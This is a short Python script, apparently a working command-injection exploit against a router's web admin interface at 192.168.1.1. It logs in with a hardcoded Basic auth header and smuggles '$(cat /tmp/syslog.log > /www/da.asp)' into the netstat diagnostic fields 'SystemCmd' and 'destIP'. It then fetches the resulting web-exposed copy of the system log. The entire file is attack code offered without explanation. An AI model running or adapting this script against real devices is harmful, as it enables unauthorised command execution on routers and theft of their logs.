import requests
import time

#proxies = { 'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080' }

url_1 = 'http://192.168.1.1/apply.cgi?'
url_2 = 'http://192.168.1.1/Main_Netstat_Content.asp'
url_3 = 'http://192.168.1.1/da.asp'

params = {
    'current_page': 'Main_Netstat_Content.asp',
    'next_page': 'Main_Netstat_Content.asp',
    'group_id': '',
    'modified': '0',
    'action_mode': ' Refresh ',
    'action_script': '',
    'action_wait': '',
    'first_time': '',
    'preferred_lang': 'CN',
    'SystemCmd': 'netstat -a -n,$(cat /tmp/syslog.log  >  /www/da.asp)',
    'firmver': '3.0.0.4',
    'cmdMethod': 'netstat',
    'destIP': 'netstat -a -n,$(cat /tmp/syslog.log  >  /www/da.asp)',
    'pingCNT': '5'
}


headers = {
    'Authorization': 'Basic YWRtaW46MTIzNDU2',
}

requests.get(url_1, params=params, headers=headers)

requests.get(url_2, headers=headers)

time.sleep(3)

response = requests.get(url_3,headers=headers)

print(response.content)


